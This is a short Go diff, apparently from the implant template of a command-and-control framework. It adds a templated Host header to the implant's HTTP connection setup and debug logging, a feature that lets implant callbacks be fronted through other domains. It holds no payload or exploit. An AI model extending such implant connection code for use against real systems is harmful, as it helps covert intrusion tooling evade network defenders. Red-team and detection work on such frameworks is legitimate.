@@ -47,8 +47,7 @@ var (
 	keyPEM    = `{{.Key}}`
 	certPEM   = `{{.Cert}}`
 	caCertPEM = `{{.CACert}}`
-	caCertPEM2 = `{{.Hostheader}}`
-
+	hostHeader = `{{.Hostheader}}`
 
 	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
@@ -284,9 +283,9 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 func httpConnect(uri *url.URL) (*Connection, error) {
 
 	// {{if .Debug}}
-	log.Printf("Connecting -> http(s)://%s", uri.Host)
+	log.Printf("Connecting -> http(s)://%s with host header: %s", uri.Host, hostHeader)
 	// {{end}}
-	client, err := HTTPStartSession(uri.Host)
+	client, err := HTTPStartSession(uri.Host, hostHeader)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("http(s) connection error %v", err)
